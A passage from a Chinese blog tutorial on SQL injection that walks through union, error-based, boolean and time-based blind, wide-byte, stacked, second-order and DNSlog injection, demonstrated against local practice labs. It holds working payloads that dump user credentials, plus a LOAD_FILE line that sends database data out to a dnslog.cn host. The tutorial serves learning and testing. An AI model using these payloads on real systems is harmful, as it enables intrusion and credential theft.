==》</li><li>盲注        ==》 盲注既不能看到数据的回显，也没有报错</li></ul><p>​      1.布尔盲注 通过sql的函数来逐个读取字符串，通过页面是否正常显示来判断猜解内容是否正确</p><p>​      2.时间盲注 通过sleep函数来判断猜解内容是否正确（sleep()内的数值建议设置在5-10s） </p><h3 id="根据编码问题："><a href="#根据编码问题：" class="headerlink" title="根据编码问题："></a>根据编码问题：</h3><ul><li>宽字节注入 ==》 由于网站会设置一些对用户输入内容的转义，通过编码，能够使我们注入语句中的单引号等符号得到正确显示  </li></ul><h2 id="0x04-Union联合查询"><a href="#0x04-Union联合查询" class="headerlink" title="0x04 Union联合查询"></a>0x04 Union联合查询</h2><p>UNION操作符用于合并两个或多个select语句的结果集，注意：UNION内部的SELECT语句前后必须有相同数量的列，列也必须有相似的数据类型，同时每条SELECT语句中的列的顺序必须相同。</p><p>SQL UNION 语法：</p><p>SELECT column_name FROM tables1 UNION SELECT column_name FROM tables2</p><p>注释：默认的，UNION操作符选取不同的值，如果允许重复，请使用UNION ALL</p><p>以sql-labs-master靶场第一关为例：</p><p>\1.判断是否有注入点，并判断其符号</p><p><a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a> ==》id=1’ id=1” id=1) 等</p><p>\2.判断其列数并定位可显示数据的位置</p><p><a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a> order by 3 –+  ==&gt;采用而二分法确定列数</p><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> union select 1,2,3 –+ ==》定位可显示数据的列</p><p>\3.查看当前数据库（若第二、三列可回显）</p><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(schema_name) from information_schema.schemata  –+ ==&gt;查看当前所有数据库</p><p>\4.查看当前数据库的数据表(当前在security数据库)</p><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security”–+ ==&gt;获取security内的所有表</p><p>\5. 查看所包含的列的信息（当前在users表）</p><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users”–+ ==》获取users表的所有字段</p><p>数据库中有很多users表，但我们要查出当前security的users表</p><p>\6. 获取字段中关键信息（在users表查询并连接信息）</p><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> union select 1,2,group_concat(password,”_”,username) from users–+</p><p><a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a> union select 1,2,group_concat(concat_ws(“_”,password, username))  from users–+  ==》连接所有账号信息</p><p>主要思路：查库=》查表=》查列=》查字段=》获取信息</p><h2 id="0x05-报错注入"><a href="#0x05-报错注入" class="headerlink" title="0x05 报错注入"></a>0x05 报错注入</h2><h3 id="1-原理："><a href="#1-原理：" class="headerlink" title="1.原理："></a>1.原理：</h3><p>这是一种页面响应形式，响应过程如下：用户在前台页面上输入检索内容时，后台将前端页面上输入的内容不加区别的拼接成sql语句在数据库执行。数据库将执行结果返回给后台。后台将数据库执行结果不加区别的显示到前台页面。</p><h3 id="2-条件："><a href="#2-条件：" class="headerlink" title="2.条件："></a>2.条件：</h3><p>MySQL报错信息必须能够在页面回显：区分php报错和mysql报错。报错注入页面没有显示位，但有sql语句执行错误信息，输出-1’ and extractvalue(1, concat( ‘~’ ,(select version() limit 0,1))) –+</p><h3 id="3-要求"><a href="#3-要求" class="headerlink" title="3.要求:"></a>3.要求:</h3><p>需要能够知道MySQL中哪些函数有限制条件，利用限制条件进行报错，需要了解函数原理有才知道熟悉运用。</p><h3 id="4-报错注入步骤-（判断闭合后）"><a href="#4-报错注入步骤-（判断闭合后）" class="headerlink" title="4.报错注入步骤:（判断闭合后）"></a>4.报错注入步骤:（判断闭合后）</h3><p>获取数据库：</p><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> and updatexml(1,concat(‘~’,(select schema_name from information_schema.schemata limit 0,1)),1) –+</p><p>获取表名：</p><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> and updatexml(1,concat(‘~’,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1) –+</p><p>获取字段名：</p><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> and updatexml(1,concat(‘~’,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1)),1) –+</p><p>可以引入substr( )函数和ascii( )函数进行单个字符的比较以及ASCII码的判断。注意：updatexml读取字符的长度只能是32位。若读取数据太长需要切片儿，如下：</p><p>select updatexml(1,concat( ‘~’ ,substr((select GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()),1,30)),1);</p><h3 id="5-报错注入的各种姿势："><a href="#5-报错注入的各种姿势：" class="headerlink" title="5.报错注入的各种姿势："></a>5.报错注入的各种姿势：</h3><p>① Extractvalue报错注入</p><p>ExtractValue(xml_frag, xpath_expr)</p><p>参数1：XML_document是String格式，为XML文档对象的名称;</p><p>参数2：XPath_string (Xpath格式的字符串).</p><p>作  用：从目标XML中返回包含所查询值的字符串</p><p>ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它 返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p><p>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p><p>extractvalue(1,concat(‘~’,(select @@version)))</p><p>② updatexml报错注入</p><p>UPDATEXML (XML_document, XPath_string, new_value);</p><p>参数1：XML_document是String格式，为XML文档对象的名称，文中为Doc</p><p>参数2：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p><p>参数3: new_value，String格式，替换查找到的符合条件的数据</p><p>作用：改变xml文档中符合条件的节点的值</p><p>updatexml(1,concat(‘~’,(SELECT @@version),0x7e),1)</p><p>③Floor()报错注入</p><p>Mysql：select * from user where id=’1’  union select count(*),concat(floor(rand(0)*2),’~ ‘,version())x from information_schema.schemata group by x;</p><p>rand( )和rand(0)</p><p>功能：返回0-1之间的随机数，如果输入随机种子参数0，每次返回的是固定的0-1之间的随机数</p><p>count(*) 的作用</p><p>功能：返回匹配指定条件对应的行数；参数及返回值：返回数据条数</p><p>group by语句工作原理</p><p>group by语法可以根据指定数据列的每个成员对查询结果进行分组统计，最终得到一个分组汇总表。</p><p>floor()函数</p><p>floor函数的作用是返回小于等于该值的最大整数 floor(2.99)=2</p><p>当group by 在查询虚拟表和插入虚拟表时，如果这两次查询语句执行的结果不一致就会引发错误，错误提示信息是插入的主键重复,通过自定义提示里报错信息中的主键值来获得敏感信息。</p><h2 id="0x06-盲注"><a href="#0x06-盲注" class="headerlink" title="0x06 盲注"></a>0x06 盲注</h2><h3 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="1.布尔盲注"></a>1.布尔盲注</h3><p>“布尔判断”指的是利用SQL语句逻辑与(and)操作，判断and两边的条件是否成立，SQL语句带入数据库查询后判断返回内容(通常返回值仅有非空和空两种状态)，类似布尔型的true和false的两种状态。</p><p>①布尔盲注步骤:(确定注入点后)</p><p>判断查询数据库数目<br><a href="http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;">http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;</a> and (select count(schema_name) from information_schema.schemata)=15 –+</p><p>判断当前数据库长度</p><p><a href="http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;">http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;</a> and length(database())=5 –+</p><p>猜解数据库名</p><p><a href="http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;">http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;</a> and substr((select schema_name from information_schema.schemata limit 1,1),1,1)=’s’ –+</p><p>猜解数据表名</p><p><a href="http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;">http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;</a> and substr((select table_name from information_schema.tables where table_schema=”bricks” limit 0,1),1,1)=’s’ –+</p><p>猜解列名</p><p><a href="http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;">http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;</a> and substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1)=’s’ –+</p><p>②使用到的函数  </p><p>length(string)</p><p>功能:获取字符串的长度</p><p>参数及返回值:</p><p>string为操作字符串，返回字符串string的长度</p><p>举例1:</p><p>$ret = length(“hello”);</p><p>ret= 5;</p><p>举例2:</p><p>length(database())&gt;5 #判断数据库名长度大于5</p><p>cast(expression as type)</p><p>功能:将任何类型的值转换为具有指定类型的值</p><p>参数及返回值:</p><p>expression为操作字符串type为转化类型，返回的是转化后的值;</p><p>举例1:</p><p>$ret = cast(’12’ as int); ret=12;</p><p>Cast函数通常和mid和ord函数-起配合使用</p><p>substr(string,start,length)<br>功能:截取字符串功能<br>返回值:为截取后的字符串<br>参数:string为操作字符串， start为开始位置， length为截取长度<br>举例1:<br>$ret = substr(“hello kali’”,2,4);<br>ret= “ello”;<br>举例2:<br>substr(database(),1,1)&gt;’a’ //判断数据库名第一位是否大于a; 再查看其他位进行判断</p><p>left(string, n) ===&gt; right()同<br>功能: 返回字符串string最左边的n个字符串<br>返回值: string最左边的n个字符串<br>参数:string为操作字符串，n为截取长度<br>举例1:<br>$ret = left(“redhat”,3);<br>ret= “red”;<br>举例2:<br>left(database(),2)=’sa’ #判断数据库名前2个字符是否位sa;再查看其他位进行判断</p><p>mid(string , start, length)<br>功能:截取字符串功能==substr( )<br>返回值:为截取后的字符串<br>参数:string为操作字符串，start为开始位置， length为截取长度<br>举例1:<br>$ret = mid(“hello kali”,2,4);<br>ret=“ello”;<br>举例2:<br>mid(database0,1,1)&gt;’a’ #判断数据库名第一位是否大于a;再查看其他位进行判断</p><p>ascii(str)<br>功能: str为字符或者字符串，用于返回字符或字符串最左边的ascii码，有时候服务器会对单引号进行转义，使用ASCII码就不用使用单引号参数:(功能和ord-样)<br>参数: char为操作;<br>返回值:返回字符char的asi码<br>举例1:<br>$ret = ascii(‘a’);<br>ret= 97;<br>举例2:<br>ascii(mid(database(),1,1))&gt; 114 #意为检测database()的第一-位ASCI码是否大于114,即是’r’</p><h3 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2. 时间盲注"></a>2. 时间盲注</h3><p>原理:利用if函数，执行判断:</p><p>如果正确，直接返回(时间很长，网速有一定的影响):</p><p>如果不正确，执行时间延迟，常用的函数有sleep和benchmark</p><p>以上操作也可反过来:</p><p>适用环境:界面无法用布尔真假判断，也无法报错注入的情况下</p><p>①时间盲注步骤（pikachu靶场）</p><p>判断闭合方式<br><a href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?username=kobe&#39;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?username=kobe&#39;</a> and sleep(5) #&amp;submit=%E6%9F%A5%E8%AF%A2</p><p>判断数据库名（pikachu）<br><a href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=vince&#39;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=vince&#39;</a> and if(ascii(substr((select database()),1,1))=112,sleep(5),1) –+&amp;submit=%E6%9F%A5%E8%AF%A2</p><p>数据表(httpinfo)<br><a href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=vince&#39;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=vince&#39;</a> and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=’pikachu’),1,1))=104,sleep(5),1) –+ &amp;submit=%E6%9F%A5%E8%AF%A2</p><p>列名(id userid ipiddress useragent httpaccep )<br><a href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=vince&#39;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=vince&#39;</a> and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=’httpinfo’ and table_schema=’pikachu’),1,1))=104,sleep(5),1) –+</p><p>②使用到的函数</p><p>if(condition,expr2,expr3)</p><p>功能:如果condition是TRUE，则IF()的返回值为expr1;否则返回值则为expr2。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定;</p><p>举例1:</p><p>Select if(true,1+1,1+2);-&gt; 2</p><p>sleep(arg1)</p><p>功能: argl为中断的时间， 单位为秒:</p><p>举例1:</p><p>if(payload, sleep(5), 1);如果测试语句正确，暂停5秒</p><p>select if (true, sleep(5),2)</p><p>SELECT if(5&gt;2,SLEEP(5),520)</p><p>benchmark()</p><p>benchmark(arg1,arg2)</p><p>arg1操作次数，arg2为表达式。</p><p>语句:and if(payload, benchmark(5000000,md5(‘abc’)), 1)</p><p>返回结果:页面延迟10秒左</p><h2 id="0x07-常见四种注入分析"><a href="#0x07-常见四种注入分析" class="headerlink" title="0x07 常见四种注入分析"></a>0x07 常见四种注入分析</h2><p>四种注入方式分析</p><p>\1. union注入能直接显示出想要数据，使用简单。</p><p>\2.报错注入输入错误会直接显示数据库错误信息，我们可以通过报错注入直接获取想要的信息，与union注入 相比，稍微麻烦- -点，但是能直接显示信息。</p><p>\3.布尔注入会间接显示查询语句是否正确，但不会显示关键信息重复操作多</p><p>\4.时间注入不管sql语句是否正确，不会返回任何信息，只能通过页面缓冲的时间来判断</p><p>综上所述，如果能够直接按union是最好的，如果爆出了数据库错误可以使用报错注入，如果没有明显错误但是间接反馈了语句是否执行正确，可以布尔注入，如果什么信息都没返回只有试试时间延迟注入。</p><h2 id="0x08-宽字节注入"><a href="#0x08-宽字节注入" class="headerlink" title="0x08 宽字节注入"></a>0x08 宽字节注入</h2><h3 id="1-注入原理"><a href="#1-注入原理" class="headerlink" title="1.注入原理:"></a>1.注入原理:</h3><p>一个GBK汉字占两个字节，每个字节有自己的取值范围，如果设置GBK编码后，遇到连续两个字节，都符合GBK取值范围，会自动解析为一个汉字。Addslashes函数防止sq|注入，将传入参数值进行转义。例如将’转义为\ ,这样我们在注入的时候闭合单引号就会变成id= ‘1&#39; 这样会导致闭合失败从而注入失败。</p><h3 id="2-涉及的函数"><a href="#2-涉及的函数" class="headerlink" title="2.涉及的函数"></a>2.涉及的函数</h3><p>mysql_real_escape_ string()</p><p>转义SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集。</p><p>string mysql_ real <em>escape</em> string( string Sunescaped_ string[,resource $link_ identifier] )</p><p>下列字符受影响:  \x00  \n  \r  \  ‘  “  \x  1a</p><p>preg_ replace函数—执行一个正则表达式的搜索和替换<br>mixed preg_ replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1[, int &amp;$count]] )</p><p>搜索subject中匹配pattern的部分，以replacement进 行替换。</p><p>addslashes()函数。</p><p>addslashes()函数转义SQL 语句中使用的字符串中的特殊字符。下列字符受影响: $a=”abc”;</p><p>1.单引号(’)    2.双引号(“)    3.反斜杠()    4. NULL</p><p>如’会被转义成\’    “被转义成\”   \被转义成\   NULL被转 义成\NULL</p><p>一个使用addslashes() 的例子是当你要往数据库中输入数据时。</p><p>例如，将名字O’reilly 插入到数据库中，这就需要对其进行转义。</p><p>string addslashes( string $str)</p><p>$value = stripslashes($value); =》去掉斜杠</p><p>mysql_real_escape_string和mysql_escape_string区别</p><p>两者都是过滤字符串，防止sql注入，但两者有一些区别</p><p>mysql_real_escape_string:</p><p>1.具有两个参数，其中第二个为选填参数，默认为上一个数据库链接connection</p><p>2.使用之前要先连接上数据库，否则会出错</p><p>3.在过滤字符串的时候，会考虑当前链接connection字符集，(set names ‘utf-8’)</p><p>mysql_escapte_string是处理单个字符串函数.</p><p>不过从PHP5.4开始，PHP官方就鼓励使用mysqli和PDO来操作数据库了。</p><h3 id="3-宽字节注入防御"><a href="#3-宽字节注入防御" class="headerlink" title="3.宽字节注入防御"></a>3.宽字节注入防御</h3><p>①使用mysql_ set_ charset(GBK)指定字符集<br>②使用mysql_real <em>escape_string进行转义<br>原理是，mysql_real_escape</em> string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢?就是使用mysql_set_charset进行指定。上述的两个条件是”与”运算的关系，少一条都不行。</p><p>在进行php 连接mysql 时，当设置”ser character_set_client=gbk” 时会导致一个编码转换的注入问题，也就是熟悉的宽字节注入，当存在宽字节注入时，%df%27 可把程序中过滤的\ （%5c）吃掉。</p><h2 id="0x09-堆查询注入"><a href="#0x09-堆查询注入" class="headerlink" title="0x09 堆查询注入"></a>0x09 堆查询注入</h2><h3 id="1-什么是堆叠注入"><a href="#1-什么是堆叠注入" class="headerlink" title="1.什么是堆叠注入?"></a>1.什么是堆叠注入?</h3><p>在SQL中，分号( ; )是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sq|语句后继续构造下一条语句，会不会一 起执行?因此这个想法也就造就了堆叠注入。而union injection (联合注入)也是将两条语句合并在一-起，两者之间有什么区别么? 区别就在于union或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><h3 id="2-堆叠注入局限性"><a href="#2-堆叠注入局限性" class="headerlink" title="2.堆叠注入局限性"></a>2.堆叠注入局限性</h3><p>局限1:堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>局限2:虽然堆叠查询可以执行任意的sql 语句，但这 种注入方式并不是十分完美。在web系统中，因为代码通常 只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时， 建议使用 union (联合)注入。同时 在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p><h2 id="0x0A-其他类型注入"><a href="#0x0A-其他类型注入" class="headerlink" title="0x0A 其他类型注入"></a>0x0A 其他类型注入</h2><h3 id="1-二次注入"><a href="#1-二次注入" class="headerlink" title="1.二次注入"></a>1.二次注入</h3><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。二次注入 也称为存储型注入。</p><p>二次注入，可以概括为以下两步:</p><p>第一步:插入恶意数据</p><p>进行数据库插入数据时，对其中的特殊字符进行转义处理，在写入数据库时又保留了原来的数据。</p><p>第二步:引用恶意数据</p><p>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p><h3 id="2-二次编码注入-部分函数可见前宽字节注入"><a href="#2-二次编码注入-部分函数可见前宽字节注入" class="headerlink" title="2.二次编码注入(部分函数可见前宽字节注入)"></a>2.二次编码注入(部分函数可见前宽字节注入)</h3><p>现通常Web应用程序大多都会进行参数过滤，来防止注入。如果某处使用了urldecode或者 rawurldecode 函数，则会导致二次解码生成单引号二引发注入，即二次注入。</p><p>Web应用程序通常使用addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数或者开启GPC来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。<br>原理：由于我们提交id参数到webserver时，webserver会自动解码一次，假设目标程序开启了GPC，我们提交参数id=1%2527 ，经过第一次解码后，%25解码结果为%，则参数为id=1%27，第二次程序使用了urldecode 或者 rawurldecode 函数来解码id参数，则解码后结果为id=1’ ，这时单引号成功出现引发注入。</p><h3 id="3-dnslog注入"><a href="#3-dnslog注入" class="headerlink" title="3.dnslog注入"></a>3.dnslog注入</h3><p>select LOAD_FILE(CONCAT(‘\\‘,(SELECT version()),’.tfq4oz.dnslog.cn\abc’)); –+</p><p>利用dns解析日志来达到快速盲注。</p><h2 id="0x0B-参考文章"><a href="#0x0B-参考文章" class="headerlink" title="0x0B 参考文章"></a>0x0B 参考文章</h2><p><a href="https://blog.csdn.net/qq_36711453/article/details/83714363">https://blog.csdn.net/qq_36711453/article/details/83714363</a>   关于二次注入部分</p><p><a href="https://xz.aliyun.com/t/2869">https://xz.aliyun.com/t/2869</a>   其他注入方式</p><h2 id="0x0C-小结"><a href="#0x0C-小结" class="headerlink" title="0x0C 小结"></a>0x0C 小结</h2><p>在写这个文章得过程中仍然发现自己在很多知识的理解和使用上存在欠缺，希望在日后的生活中能够慢慢练熟，摸透。。。如果文中哪些知识点存在问题，请您指正，不甚感激。。。学安全，菜是原罪，只能好好努力啦。。</p><p>然后我这里有关于sql,xss,dvwa,webug,pikachu,文件上传等一些靶场，还有大佬总结的sql-labs-master的通关宝典，有需要私信我。。。加油啦</p><p>本文作者：hackerqdy， 转载请注明来自<a href="https://www.qdy2020.top/">GitHub</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
